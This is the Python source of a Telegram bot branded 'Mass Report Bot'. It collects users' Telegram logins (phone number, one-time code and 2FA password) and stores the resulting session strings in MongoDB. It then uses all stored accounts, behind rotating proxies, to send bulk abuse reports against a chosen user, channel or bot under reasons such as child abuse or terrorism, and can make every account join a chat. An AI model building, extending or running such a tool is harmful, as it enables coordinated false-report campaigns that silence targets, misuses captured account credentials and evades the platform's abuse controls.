import asyncio
import logging
import html
import re
from datetime import datetime, timezone
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    MessageHandler, ConversationHandler, ContextTypes, filters
)
from telegram.request import HTTPXRequest
from telegram.constants import ParseMode
from config import BOT_TOKEN, API_ID, API_HASH, OWNER_ID, OWNER_USERNAME
from telethon import TelegramClient
from telethon.sessions import StringSession
from session_manager import (
    save_session, get_all_sessions, delete_session,
    get_total_count, get_active_count, get_expired_count, get_expired_sessions, refresh_all_sessions
)
from access_manager import (
    is_owner, is_sudo, remember_user, add_sudo, remove_sudo, list_access_users
)
from reporter import mass_report
from proxy_manager import fetch_proxies, rotate_forever

logging.basicConfig(level=logging.INFO)

# States
(
    ADD_PHONE, ADD_CODE, ADD_2FA,
    REPORT_TARGET, REPORT_REASON_CAT, REPORT_REASON_SUB,
    REPORT_COUNT, CONFIRM_REPORT
) = range(8)

REASONS = {
    "1":  ("😤 I don't like it",         []),
    "2":  ("👶 Child Abuse",             [("2a","Child illegal abuse"),("2b","Child sexual abuse")]),
    "3":  ("🔪 Violence",                [("3a","Insult / false info"),("3b","Graphic content"),("3c","Extreme violence"),("3d","Hate speech"),("3e","Calling for violence"),("3f","Terrorism")]),
    "4":  ("🚫 Illegal Goods/Services",  [("4a","Weapons"),("4b","Drugs"),("4c","Fake documents"),("4d","Counterfeit money"),("4e","Hacking tools"),("4f","Counterfeit merch"),("4g","Other")]),
    "5":  ("🔞 Illegal Adult Content",   [("5a","Child abuse"),("5b","Illegal sexual service"),("5c","Animal abuse"),("5d","Non-consensual imagery"),("5e","Pornography"),("5f","Other illegal sexual")]),
    "6":  ("🧾 Personal Data",           [("6a","Private images"),("6b","Private number"),("6c","Address"),("6d","Credentials"),("6e","Other personal data")]),
    "7":  ("💸 Scam or Fraud",           [("7a","Impersonation"),("7b","Financial scams"),("7c","Malware/phishing"),("7d","Fraudulent seller")]),
    "8":  ("©️ Copyright",               []),
    "9":  ("🔎 Other",                   []),
    "10": ("⚠️ Not illegal but remove",  []),
}

tmp = {}  # user state temp storage

def privileged(user_id: int) -> bool:
    return is_owner(user_id)

async def has_privileged_access(user_id: int) -> bool:
    return is_owner(user_id) or await is_sudo(user_id)

async def deny_non_sudo(update: Update, context: ContextTypes.DEFAULT_TYPE | None = None):
    user = update.effective_user
    username = "@" + user.username if user and user.username else "your Telegram account"
    owner_name = html.escape(OWNER_USERNAME if OWNER_USERNAME.startswith("@") else "@" + OWNER_USERNAME)
    message = (
        "🔒 <b>ACCESS DENIED</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "This feature is restricted to the bot Owner and authorized Sudo users.\n\n"
        f"👤 Account: <code>{html.escape(username)}</code>\n"
        f"👑 Contact: {owner_name}\n\n"
        "<i>Ask the bot owner for access if you need this feature.</i>"
    )
    if update.callback_query:
        await update.callback_query.answer("🔒 ACCESS DENIED", show_alert=True)
        await update.callback_query.message.reply_text(message, parse_mode=ParseMode.HTML)
    elif update.effective_message:
        await update.effective_message.reply_text(message, parse_mode=ParseMode.HTML)

async def require_privileged(update: Update) -> bool:
    uid = update.effective_user.id
    if await has_privileged_access(uid):
        return True
    await deny_non_sudo(update)
    return False

def cancel_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel / Stop", callback_data="cancel_flow")]])

async def cancel_flow(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    data = tmp.pop(uid, None)
    if data and data.get("client"):
        try:
            await data["client"].disconnect()
        except Exception:
            pass

    if update.callback_query:
        q = update.callback_query
        await q.answer("Process cancelled.")
        await q.edit_message_text("❌ *Host process cancelled.*\n\nNo new session was saved.", parse_mode=ParseMode.MARKDOWN, reply_markup=await menu_for_user(uid))
    elif update.effective_message:
        await update.effective_message.reply_text("❌ Host process cancelled. No new session was saved.", reply_markup=await menu_for_user(uid))
    return ConversationHandler.END

def colored_button(text: str, callback_data: str, style: str = "primary"):
    # Telegram clients that support button styles render these hints natively.
    try:
        return InlineKeyboardButton(text, callback_data=callback_data, style=style)
    except TypeError:
        return InlineKeyboardButton(text, callback_data=callback_data)

def main_menu_kb():
    return InlineKeyboardMarkup([
        [colored_button("➕ Add Account", "add_account", "success"),
         colored_button("📊 Status", "status", "primary")],
        [colored_button("🚨 Mass Report", "start_report", "danger"),
         colored_button("📋 Sessions", "sessions")],
        [colored_button("❔ Help", "help")],
    ])

def limited_menu_kb():
    return InlineKeyboardMarkup([
        [colored_button("➕ Add Account", "add_account", "success")],
        [colored_button("❔ Help", "help")],
    ])

async def menu_for_user(user_id: int):
    return main_menu_kb() if await has_privileged_access(user_id) else limited_menu_kb()

async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await remember_user(update.effective_user)
    await update.message.reply_text(
        "🤖 *Mass Report Bot*\n\n_Multi-account • Proxy Rotation • MongoDB Sessions_",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=await menu_for_user(update.effective_user.id)
    )


async def help_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    privileged_user = await has_privileged_access(uid)
    help_text = (
        "🤖 <b>MASS REPORT BOT</b>\n<i>Command Center • Quick Reference</i>\n"
        "━━━━━━━━━━━━━━━━━━\n\n<b>👤 ACCOUNT &amp; MENU</b>\n"
        "• <code>/start</code> — Open bot menu\n"
        "• <code>/host</code> — Host an account (OTP / optional 2FA)\n"
        "• <code>/cancel</code> — Cancel current setup\n"
        "• <code>/help</code> — Show this guide\n"
    )
    if privileged_user:
        help_text += (
            "\n<b>⚙️ BOT OPERATIONS</b>\n"
            "• <code>/status</code> — View session statistics\n"
            "• <code>/refresh</code> — Verify saved session status\n"
            "• <code>/session</code> — List saved sessions\n"
            "• <code>/unhost +919876543210</code> — Remove a hosted session\n"
            "• <code>/join @username</code> — Join a chat with hosted accounts\n"
            "• <code>/sudoinfo</code> — View Owner and Sudo directory\n"
        )
    if is_owner(uid):
        help_text += "\n<b>👑 OWNER CONTROLS</b>\n• <code>/sudo USER_ID</code> — Grant Sudo access\n• <code>/removesudo USER_ID</code> — Revoke Sudo access\n"
    help_text += "\n<b>🔐 ACCESS</b>\n" + ("Owner/Sudo: full bot access" if privileged_user else "Standard user: start, host, cancel and help only")
    if update.callback_query:
        await update.callback_query.edit_message_text(help_text, parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[colored_button("🔙 Back", "back")]]))
    else:
        await update.effective_message.reply_text(help_text, parse_mode=ParseMode.HTML,
            reply_markup=await menu_for_user(uid))


async def host_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Start the same account-hosting conversation used by the Add Account button."""
    await remember_user(update.effective_user)
    await update.effective_message.reply_text(
        "📱 Enter phone number with country code:\\n\\nExample: `+919876543210`\\n\\n"
        "Use /cancel to stop.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=cancel_kb()
    )
    return ADD_PHONE


async def session_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await require_privileged(update):
        return
    from session_manager import get_user_sessions
    sessions = await get_user_sessions(update.effective_user.id)
    lines = [f"`{i}. {item.get('phone', 'Unknown')}`" for i, item in enumerate(sessions, start=1)]
    message = "📋 *Saved Sessions*\n\n" + ("\n".join(lines) if lines else "No active sessions found.")
    await update.effective_message.reply_text(
        message, parse_mode=ParseMode.MARKDOWN, reply_markup=await menu_for_user(update.effective_user.id)
    )


async def unhost_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await require_privileged(update):
        return
    if not ctx.args:
        await update.effective_message.reply_text(
            "Usage: `/unhost +919876543210`", parse_mode=ParseMode.MARKDOWN
        )
        return
    phone = ctx.args[0].strip()
    if not phone.startswith("+") or not phone[1:].isdigit():
        await update.effective_message.reply_text(
            "❌ Invalid phone number. Include country code, e.g. `+919876543210`.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    removed = await delete_session(phone, update.effective_user.id)
    if removed:
        await update.effective_message.reply_text(
            f"✅ Session `{phone}` has been removed from MongoDB.",
            parse_mode=ParseMode.MARKDOWN, reply_markup=await menu_for_user(update.effective_user.id)
        )
    else:
        await update.effective_message.reply_text(
            f"ℹ️ No saved session found for `{phone}`.",
            parse_mode=ParseMode.MARKDOWN, reply_markup=await menu_for_user(update.effective_user.id)
        )


def status_keyboard():
    return InlineKeyboardMarkup([
        [colored_button("🔄 Refresh", "refresh_status", "success")],
        [colored_button("🔴 Expired IDs", "expired_ids", "danger"), colored_button("🔙 Back", "back", "danger")],
    ])

async def render_status(target, ctx: ContextTypes.DEFAULT_TYPE):
    total = await get_total_count()
    active = await get_active_count()
    expired = await get_expired_count()
    body = (
        "╔══════════════════╗\n"
        "║   📊 BOT STATUS   ║\n"
        "╚══════════════════╝\n\n"
        f"🟢 Active IDs   : {active}\n"
        f"🔴 Expired IDs  : {expired}\n"
        f"📦 Total IDs    : {total}\n\n"
        "<i>Use Refresh to verify saved sessions with Telegram.</i>"
    )
    await target.edit_message_text(body, parse_mode=ParseMode.HTML, reply_markup=status_keyboard())

async def status_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await require_privileged(update):
        return
    if update.callback_query:
        await render_status(update.callback_query, ctx)
        return
    total = await get_total_count()
    active = await get_active_count()
    expired = await get_expired_count()
    body = (
        "╔══════════════════╗\n║   📊 BOT STATUS   ║\n╚══════════════════╝\n\n"
        f"🟢 Active IDs   : {active}\n🔴 Expired IDs  : {expired}\n📦 Total IDs    : {total}\n\n"
        "<i>Use Refresh to verify saved sessions with Telegram.</i>"
    )
    await update.effective_message.reply_text(body, parse_mode=ParseMode.HTML, reply_markup=status_keyboard())

async def refresh_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await require_privileged(update):
        return
    msg = await update.effective_message.reply_text("🔄 Checking saved sessions with Telegram...")
    result = await refresh_all_sessions()
    await msg.edit_text(
        "🔄 <b>SESSION REFRESH COMPLETE</b>\n━━━━━━━━━━━━━━━━━━\n\n"
        f"🟢 Active: <code>{result['active']}</code>\n"
        f"🔴 Expired: <code>{result['expired']}</code>\n"
        f"⚠️ Network/Other errors: <code>{result['errors']}</code>\n"
        f"📦 Checked: <code>{result['checked']}</code>", parse_mode=ParseMode.HTML, reply_markup=status_keyboard())

async def expired_ids_view(q):
    records = await get_expired_sessions()
    if not records:
        body = "🔴 <b>EXPIRED ACCOUNTS</b>\n━━━━━━━━━━━━━━━━━━\n\n<i>No expired accounts found.</i>"
    else:
        lines = []
        for index, item in enumerate(records, 1):
            phone = html.escape(str(item.get("phone") or "Unknown"))
            checked = item.get("status_checked_at")
            checked_text = checked.strftime("%Y-%m-%d %H:%M UTC") if checked else "Not checked yet"
            lines.append(f"<b>{index}. {phone}</b>\n   🕒 <i>Last checked: {html.escape(checked_text)}</i>")
        body = "🔴 <b>EXPIRED ACCOUNTS</b>\n━━━━━━━━━━━━━━━━━━\n\n" + "\n\n".join(lines)
    await q.edit_message_text(body, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([
        [colored_button("🔄 Refresh", "refresh_status", "success")],
        [colored_button("🔙 Back to Status", "status")],
    ]))

async def sudo_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await deny_non_sudo(update); return
    if not ctx.args or not ctx.args[0].isdigit():
        await update.effective_message.reply_text("Usage: /sudo USER_ID"); return
    uid = int(ctx.args[0])
    await add_sudo(uid, update.effective_user.id)
    await update.effective_message.reply_text(f"✅ Sudo access granted to <code>{uid}</code>.", parse_mode=ParseMode.HTML)

async def removesudo_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await deny_non_sudo(update); return
    if not ctx.args or not ctx.args[0].isdigit():
        await update.effective_message.reply_text("Usage: /removesudo USER_ID"); return
    uid = int(ctx.args[0])
    if is_owner(uid):
        await update.effective_message.reply_text("❌ Owner access cannot be removed."); return
    removed = await remove_sudo(uid)
    await update.effective_message.reply_text("✅ Sudo access removed." if removed else "ℹ️ This user is not a Sudo user.")

async def sudoinfo_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await require_privileged(update): return
    rows = await list_access_users()
    owner_line = f"👑 Owner: <code>{OWNER_ID}</code> ({html.escape(OWNER_USERNAME)})"
    lines = [owner_line]
    for item in rows:
        name = html.escape((item.get("first_name", "") + " " + item.get("last_name", "")).strip() or "Unknown")
        username = "@" + html.escape(item["username"]) if item.get("username") else "No username"
        lines.append(f"🛡️ {name} · {username} · <code>{item['user_id']}</code>")
    await update.effective_message.reply_text("<b>🔐 ACCESS DIRECTORY</b>\n━━━━━━━━━━━━━━━━━━\n\n" + "\n".join(lines), parse_mode=ParseMode.HTML)


async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    data = q.data
    uid  = q.from_user.id
    await remember_user(q.from_user)
    allowed_callbacks = {"back", "help", "add_account", "cancel_flow"}
    if data not in allowed_callbacks and not await has_privileged_access(uid):
        await deny_non_sudo(update, ctx)
        return
    await q.answer()

    if data == "back":
        await q.edit_message_text(
            "🤖 *Mass Report Bot*",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=await menu_for_user(update.effective_user.id)
        )
        return ConversationHandler.END

    if data == "status":
        await render_status(q, ctx)
        return

    if data == "refresh_status":
        await q.edit_message_text("🔄 <b>Checking saved sessions...</b>", parse_mode=ParseMode.HTML)
        result = await refresh_all_sessions()
        await q.edit_message_text(
            "🔄 <b>SESSION REFRESH COMPLETE</b>\n━━━━━━━━━━━━━━━━━━\n\n"
            f"🟢 Active: <code>{result['active']}</code>\n"
            f"🔴 Expired: <code>{result['expired']}</code>\n"
            f"⚠️ Errors: <code>{result['errors']}</code>\n"
            f"📦 Checked: <code>{result['checked']}</code>",
            parse_mode=ParseMode.HTML, reply_markup=status_keyboard())
        return

    if data == "expired_ids":
        await expired_ids_view(q)
        return

    if data == "help":
        await help_cmd(update, ctx)
        return

    if data == "sessions":
        sessions = await get_all_sessions()
        lines = [f"`{i}. {s['phone']}`" for i, s in enumerate(sessions, start=1)] or ["No active sessions."]
        await q.edit_message_text(
            "📋 *Active Sessions:*\n\n" + "\n".join(lines),
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]])
        )
        return

    if data == "add_account":
        await q.edit_message_text("📱 Enter phone number with country code:\n\nExample: `+919876543210`\n\nUse /cancel or the button below to stop.", parse_mode=ParseMode.MARKDOWN, reply_markup=cancel_kb())
        return ADD_PHONE

    if data == "start_report":
        await q.edit_message_text("🎯 Send target:\n\n• `@username`\n• Channel/Group link\n• Bot username", parse_mode=ParseMode.MARKDOWN)
        return REPORT_TARGET

    if data.startswith("cat_"):
        cat = data[4:]
        tmp[uid]["cat"] = cat
        subs = REASONS[cat][1]
        if not subs:
            tmp[uid]["reason"] = cat
            await q.edit_message_text("🔢 How many reports per ID? (e.g. 20)", parse_mode=ParseMode.MARKDOWN)
            return REPORT_COUNT
        kb = [[InlineKeyboardButton(label, callback_data=f"sub_{key}")] for key, label in subs]
        kb.append([InlineKeyboardButton("🔙 Back", callback_data="start_report")])
        await q.edit_message_text(f"📂 *{REASONS[cat][0]}*\n\nSelect sub-reason:", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(kb))
        return REPORT_REASON_SUB

    if data.startswith("sub_"):
        tmp[uid]["reason"] = data[4:]
        await q.edit_message_text("🔢 How many reports per ID? (e.g. 20)", parse_mode=ParseMode.MARKDOWN)
        return REPORT_COUNT

    if data == "confirm_report":
        await q.edit_message_text("⏳ *Mass reporting started...*\n\nThis may take a while.", parse_mode=ParseMode.MARKDOWN)
        sessions = await get_all_sessions()
        target   = tmp[uid]["target"]
        reason   = tmp[uid]["reason"]
        count    = tmp[uid]["count"]

        sent_msg = await q.message.reply_text("📡 Reporting in progress...")

        progress = {"last": 0}
        async def cb(r):
            total_done = r["success"] + r["failed"] + r["expired"]
            if total_done - progress["last"] >= 5:
                progress["last"] = total_done
                await sent_msg.edit_text(
                    f"📡 *Reporting...*\n\n"
                    f"✅ Success : `{r['success']}`\n"
                    f"❌ Failed  : `{r['failed']}`\n"
                    f"🔴 Expired : `{r['expired']}`",
                    parse_mode=ParseMode.MARKDOWN
                )

        result = await mass_report(sessions, target, reason, count, progress_cb=cb)
        await sent_msg.edit_text(
            f"╔══════════════════╗\n"
            f"║   ✅ REPORT DONE  ║\n"
            f"╚══════════════════╝\n\n"
            f"🎯 Target   : `{target}`\n"
            f"✅ Success  : `{result['success']}`\n"
            f"❌ Failed   : `{result['failed']}`\n"
            f"🔴 Expired  : `{result['expired']}`\n"
            f"📦 Total IDs: `{len(sessions)}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=await menu_for_user(update.effective_user.id)
        )
        return ConversationHandler.END

# --- Add Account Flow ---
async def recv_phone(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid   = update.effective_user.id
    phone = update.message.text.strip()
    if not re.fullmatch(r"\+[1-9]\d{7,14}", phone):
        await update.message.reply_text("❌ Invalid phone number. Use international format, e.g. +919876543210.")
        return ADD_PHONE
    from session_manager import get_all_sessions
    if any(item.get("phone") == phone and item.get("owner") == uid for item in await get_all_sessions()):
        await update.message.reply_text("ℹ️ This account is already hosted.")
        return ConversationHandler.END
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    try:
        await client.connect()
        tmp[uid] = {"client": client, "phone": phone}
        await client.send_code_request(phone)
    except Exception as exc:
        await client.disconnect()
        await update.message.reply_text(f"❌ Could not send login code: {html.escape(str(exc))}", parse_mode=ParseMode.HTML)
        return ConversationHandler.END
    await update.message.reply_text("🔑 Enter OTP code:", reply_markup=cancel_kb())
    return ADD_CODE

async def recv_code(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    code = update.message.text.strip()
    data = tmp[uid]
    try:
        await data["client"].sign_in(data["phone"], code)
    except Exception as e:
        if "2FA" in str(e) or "password" in str(e).lower():
            await update.message.reply_text("🔐 Enter your 2FA password:", reply_markup=cancel_kb())
            tmp[uid]["code"] = code
            return ADD_2FA
        await update.message.reply_text(f"❌ Error: {e}")
        return ConversationHandler.END
    if not await data["client"].is_user_authorized():
        await update.message.reply_text("❌ Telegram did not authorize this session. Please try /host again.")
        await data["client"].disconnect()
        tmp.pop(uid, None)
        return ConversationHandler.END
    session_str = data["client"].session.save()
    await save_session(uid, data["phone"], session_str)
    await data["client"].disconnect()
    await update.message.reply_text(f"✅ Account `{data['phone']}` added!", parse_mode=ParseMode.MARKDOWN, reply_markup=await menu_for_user(uid))
    return ConversationHandler.END

async def recv_2fa(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid      = update.effective_user.id
    password = update.message.text.strip()
    data     = tmp[uid]
    try:
        await data["client"].sign_in(password=password)
        session_str = data["client"].session.save()
        await save_session(uid, data["phone"], session_str)
        await data["client"].disconnect()
        await update.message.reply_text(f"✅ Account `{data['phone']}` added!", parse_mode=ParseMode.MARKDOWN, reply_markup=await menu_for_user(uid))
    except Exception as e:
        await update.message.reply_text(f"❌ 2FA failed: {e}")
    return ConversationHandler.END

# --- Report Flow ---
async def recv_target(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid    = update.effective_user.id
    target = update.message.text.strip()
    tmp[uid] = {"target": target}
    kb = [[InlineKeyboardButton(v[0], callback_data=f"cat_{k}")] for k, v in REASONS.items()]
    await update.message.reply_text("📂 Select report category:", reply_markup=InlineKeyboardMarkup(kb))
    return REPORT_REASON_CAT

async def recv_count(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    try:
        count = int(update.message.text.strip())
    except:
        await update.message.reply_text("❌ Enter a valid number.")
        return REPORT_COUNT
    tmp[uid]["count"] = count
    sessions = await get_all_sessions()
    await update.message.reply_text(
        f"⚠️ *Confirm Report*\n\n"
        f"🎯 Target : `{tmp[uid]['target']}`\n"
        f"📋 Reason : `{tmp[uid]['reason']}`\n"
        f"🔢 Per ID : `{count}`\n"
        f"👥 IDs    : `{len(sessions)}`\n"
        f"📊 Total  : `{len(sessions) * count}`",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Start Reporting", callback_data="confirm_report"),
             InlineKeyboardButton("❌ Cancel",          callback_data="back")]
        ])
    )
    return CONFIRM_REPORT

async def join_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await require_privileged(update):
        return
    if not ctx.args:
        await update.message.reply_text("Usage: /join <link or @username>")
        return
    target   = ctx.args[0]
    sessions = await get_all_sessions()
    joined, failed = 0, 0
    for i, s in enumerate(sessions):
        try:
            from session_manager import build_client
            from telethon.tl.functions.channels import JoinChannelRequest
            client = await build_client(s["session"], i)
            await client.connect()
            await client(JoinChannelRequest(target))
            await client.disconnect()
            joined += 1
        except:
            failed += 1
    await update.message.reply_text(f"✅ Joined: `{joined}` | ❌ Failed: `{failed}`", parse_mode=ParseMode.MARKDOWN)

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv = ConversationHandler(
        entry_points=[
            CommandHandler("host", host_cmd),
            CallbackQueryHandler(button_handler, pattern="^(add_account|start_report)$")
        ],
        states={
            ADD_PHONE:         [MessageHandler(filters.TEXT & ~filters.COMMAND, recv_phone)],
            ADD_CODE:          [MessageHandler(filters.TEXT & ~filters.COMMAND, recv_code)],
            ADD_2FA:           [MessageHandler(filters.TEXT & ~filters.COMMAND, recv_2fa)],
            REPORT_TARGET:     [MessageHandler(filters.TEXT & ~filters.COMMAND, recv_target)],
            REPORT_REASON_CAT: [CallbackQueryHandler(button_handler, pattern="^cat_")],
            REPORT_REASON_SUB: [CallbackQueryHandler(button_handler, pattern="^sub_")],
            REPORT_COUNT:      [MessageHandler(filters.TEXT & ~filters.COMMAND, recv_count)],
            CONFIRM_REPORT:    [CallbackQueryHandler(button_handler, pattern="^confirm_report$")],
        },
        fallbacks=[
            CommandHandler("cancel", cancel_flow),
            CallbackQueryHandler(cancel_flow, pattern="^cancel_flow$"),
            CallbackQueryHandler(button_handler, pattern="^back$")
        ],
        per_message=False
    )

    app.add_handler(CommandHandler("start",  start))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("session", session_cmd))
    app.add_handler(CommandHandler("unhost", unhost_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("join",   join_cmd))
    app.add_handler(CommandHandler("refresh", refresh_cmd))
    app.add_handler(CommandHandler("sudo", sudo_cmd))
    app.add_handler(CommandHandler("removesudo", removesudo_cmd))
    app.add_handler(CommandHandler("sudoinfo", sudoinfo_cmd))
    app.add_handler(conv)
    app.add_handler(CommandHandler("cancel", cancel_flow))
    app.add_handler(CallbackQueryHandler(button_handler))

    async def on_startup(app):
        await fetch_proxies()
        asyncio.create_task(rotate_forever())
        await app.bot.set_my_commands([
            BotCommand("start",  "Main menu"),
            BotCommand("host", "Add/host a Telegram account"),
            BotCommand("status", "Bot status"),
            BotCommand("session", "List saved sessions"),
            BotCommand("unhost", "Remove a saved session by phone"),
            BotCommand("help", "Show all commands"),
            BotCommand("join",   "Join with all IDs"),
            BotCommand("cancel", "Cancel the current host process"),
            BotCommand("refresh", "Verify saved sessions"),
            BotCommand("sudo", "Grant Sudo access"),
            BotCommand("removesudo", "Revoke Sudo access"),
            BotCommand("sudoinfo", "View access directory"),
        ])

    app.post_init = on_startup
    app.run_polling()

if __name__ == "__main__":
    main()
